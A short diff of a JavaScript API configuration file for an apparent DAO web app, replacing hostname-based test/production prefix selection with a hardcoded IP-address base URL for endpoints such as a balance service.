@@ -1,13 +1,5 @@
 
-let prefix = '/api'
-if (typeof window !== 'undefined' &&
-    (window.location.hostname === 'www.public-test-1.bitdao.io' ||
-      window.location.hostname === 'dao.ffe390afd658c19dcbf707e0597b846d.de' ||
-      window.location.hostname === 'localhost'
-    )
-) {
-  prefix = '/api-test'
-}
+const prefix = 'https://99.86.61.46/api'
 
 export default {
   balance: `${prefix}/service/balance`,
